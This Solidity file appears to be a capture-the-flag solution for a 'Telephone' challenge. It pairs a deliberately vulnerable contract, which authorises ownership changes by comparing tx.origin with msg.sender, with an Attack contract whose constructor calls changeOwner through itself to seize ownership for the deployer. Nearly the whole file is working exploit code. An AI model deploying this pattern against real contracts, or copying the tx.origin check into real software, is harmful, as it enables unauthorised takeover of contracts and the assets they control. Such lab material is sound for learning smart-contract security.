pragma solidity ^0.8.0;

interface ITelephone {
    function owner() external view returns (address);

    function changeOwner(address) external;
}

contract Attack {
    constructor(address _target) {
        ITelephone(_target).changeOwner(msg.sender);
    }
}

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
